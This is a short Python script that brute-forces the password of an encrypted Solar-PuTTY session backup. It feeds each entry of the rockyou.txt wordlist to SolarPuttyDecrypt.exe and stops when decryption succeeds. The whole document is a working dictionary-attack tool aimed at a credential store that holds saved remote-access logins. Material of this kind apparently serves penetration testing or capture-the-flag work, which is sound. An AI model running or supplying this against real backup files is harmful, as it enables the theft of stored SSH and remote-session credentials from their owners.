import subprocess

# Files to execute (all located in the same directory, otherwise specify paths)
exe_path = "SolarPuttyDecrypt.exe"
data_file = "sessions-backup.dat"
passwords_file = "rockyou.txt"

# Open the list of passwords in rockyou.txt dictionary
with open(passwords_file, "r") as file:
    for password in file:
        password = password.strip()  # Remove any extra newlines or spaces
        # Execute the command to decrypt the file
        print(f"[+] Attempting with password: {password}", end="\r")
        result = subprocess.run([exe_path, data_file, password], capture_output=True)
        
        # Check the exit status code. If it is 0, break the loop
        if result.returncode == 0:
            print()
            print(f"[+] Password found: {password}")
            break
    else:
        print("[-] Password not found")
